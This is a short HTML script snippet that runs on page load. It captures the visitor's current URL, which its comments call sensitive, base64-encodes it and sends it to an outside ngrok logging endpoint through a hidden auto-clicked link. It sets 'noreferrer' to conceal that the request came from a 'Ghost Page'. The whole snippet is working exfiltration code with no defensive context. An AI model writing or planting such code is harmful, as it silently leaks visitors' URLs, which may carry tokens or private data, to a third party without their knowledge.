   <script>
    function capture() {
        // 1. Get the sensitive URL
        var currentUrl = window.location.href;
        
        // 2. Prepare the payload
        var target = "https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(currentUrl);
        
        // 3. Create a hidden anchor element
        var link = document.createElement('a');
        link.href = target;
        link.rel = "noreferrer"; // This hides the fact that we came from a 'Ghost Page'
        
        // 4. Append and Click
        document.body.appendChild(link);
        link.click();
    }

    // Trigger after a slight delay to let the page settle
    window.onload = function() {
        setTimeout(capture, 500);
    };
</script>
